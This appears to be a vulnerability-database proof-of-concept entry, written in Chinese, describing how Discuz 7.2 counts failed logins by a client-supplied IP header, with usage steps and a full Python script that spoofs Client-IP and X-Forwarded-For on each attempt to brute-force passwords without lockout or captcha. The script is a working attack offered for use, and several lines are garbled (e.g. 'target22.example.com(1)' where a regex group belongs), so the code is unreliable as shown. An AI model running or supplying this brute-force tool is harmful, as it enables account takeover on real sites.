# Discuz 7.2 failedlogins 登录失败计数绕过（伪造 Client-IP / X-Forwarded-For 实现无限爆破）

- **code**: discuz-7.2-failedlogins-登录失败计数绕过-伪造-client-ip-x-forwarded-for-实现无限爆破
- **kind**: poc
- **category**: auth-bypass
- **component**: Discuz 7.2
- **versions**: Discuz! 7.x（含 7.2 RELEASE 20101020；同族 include/common.inc.php 的 $onlineip 取值逻辑一致）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在靶标 http://example.com（Discuz! 7.2 乐彩论坛，IP 203.0.113.112）实测验证：真实出口 IP 连续 5 次错误口令后已被锁定（不带伪造头 → remain=None、locked=True）；同一时刻带 Client-IP: 203.0.113.77 / 203.0.113.78 / 198.51.100.42 及 X-Forwarded-For: 198.51.100.99 的请求全部返回「登錄失敗，您還可以嘗試 4 次」、locked=False，计数每次重置为 4。无需认证即可触发；绕过的是应用层登录失败限制与验证码触发，非直接登录绕过。
- **path**: pocs/discuz-7.2-failedlogins-登录失败计数绕过-伪造-client-ip-x-forwarded-for-实现无限爆破/poc.py
- **tags**: discuz,brute-force,auth-bypass,ip-spoofing,failedlogins
- **created_at**: 2026-09-29T06:42:54.839Z
- **found_by**: exploit

## 描述

Discuz 7.x 的登录失败限制由 failedlogins 表按来源 IP 计数：example.com 中 logincheck() 与 seccodecheck 均使用 $onlineip；而 include/common.inc.php 里 $onlineip 的取值顺序是 HTTP_CLIENT_IP → HTTP_X_FORWARDED_FOR → REMOTE_ADDR，即完全信任客户端可伪造的请求头。因此攻击者每次请求随身携带一个新的假 IP（Client-IP 或 X-Forwarded-For），失败计数就会被记到不同 IP 上，永远不会触发 login_strike（默认 5 次）锁定，也不会触发验证码（loginfailedcount）。前提：目标直接暴露或前置代理未剥离/重写这两个头。

## 用法

```
1) 先做对照实验确认目标已锁定：不带伪造头 POST 错误口令 → 若返回 remain=None / 锁定提示即命中前提。
2) 带伪造头再 POST：req.add_header("Client-IP", 随机公网IP)（可同时带 X-Forwarded-For 同值）→ 预期返回 "登錄失敗，您還可以嘗試 4 次"。
3) 每次请求更换假 IP，即可无限次尝试口令；建议多线程 + 控制总速率（3–8 req/s）避免连接层封禁。
4) 成功判据（Discuz）：响应出现 Set-Cookie: cdb_auth。
完整脚本见 content 字段（可直接改 BASE/USER 后运行）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Discuz 7.x 登录爆破 —— 伪造来源 IP 绕过 failedlogins 计数
   用法: python dz_brute_spoof.py <username> <wordlist>
"""
import http.cookiejar, random, re, sys, time, urllib.parse, urllib.request

BASE = "http://TARGET"          # 改成目标站点
USER = "admin"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.46 Safari/537.36"


def rand_ip():
    while True:
        ip = "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                              random.randint(0, 255), random.randint(1, 254))
        a, b = ip.split(".")[:2]
        if a in ("10", "127", "0", "169") or (a == "172" and 16 <= int(b) <= 31) or (a == "192" and b == "168"):
            continue
        return ip


def new_session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", UA)]
    return op, cj


def get_formhash(op, spoof):
    r = urllib.request.Request(BASE + "/example.com?action=login")
    r.add_header("Client-IP", spoof)
    r.add_header("X-Forwarded-For", spoof)
    page = op.open(r, timeout=30).read().decode("utf-8", "ignore")
    m = re.search(r'name="formhash"\s+value="([^"]+)"', page, re.I)
    return target22.example.com(1) if m else None


def try_login(op, user, pwd, formhash, spoof):
    body = ("loginfield=username&username=%s&password=%s&questionid=0&answer="
            "&formhash=%s&referer=&loginmode=&styleid=&cookietime=2592000"
            % (urllib.parse.quote(user.encode()), urllib.parse.quote(pwd.encode()), formhash))
    r = urllib.request.Request(BASE + "/example.com?action=login&loginsubmit=yes&inajax=0",
                               data=body.encode(), method="POST")
    r.add_header("Content-Type", "application/x-www-form-urlencoded")
    r.add_header("Referer", BASE + "/example.com?action=login")
    r.add_header("Client-IP", spoof)
    r.add_header("X-Forwarded-For", spoof)
    with op.open(r, timeout=30) as resp:
        page = resp.read().decode("utf-8", "ignore")
        setc = resp.headers.get_all("Set-Cookie") or []
    hit = any("cdb_auth" in c for c in setc) or any(target4.example.com == "cdb_auth" for c in op.handlers[0].cookiejar)
    return hit, page


if __name__ == "__main__":
    user = sys.argv[1] if len(sys.argv) > 1 else USER
    wl = sys.argv[2] if len(sys.argv) > 2 else "passwords.txt"
    op, _ = new_session()
    fh = get_formhash(op, rand_ip())
    print("[*] formhash=%s" % fh)
    for i, pwd in enumerate(open(wl, encoding="utf-8", errors="ignore")):
        pwd = pwd.strip()
        if not pwd:
            continue
        spoof = rand_ip()
        if i % 40 == 0:                      # 定期刷新 formhash / 会话
            fh = get_formhash(op, spoof) or fh
        hit, page = try_login(op, user, pwd, fh, spoof)
        m = re.search(r"您還可以嘗試\s*(\d+)\s*次", page)
        print("%-4d user=%s pw=%-20s spoof=%-15s remain=%s %s"
              % (i, user, pwd, spoof, target22.example.com(1) if m else "?", "*** HIT ***" if hit else ""))
        if hit:
            print("[+] 命中！user=%s password=%s" % (user, pwd))
            break
        time.sleep(1.0)

```
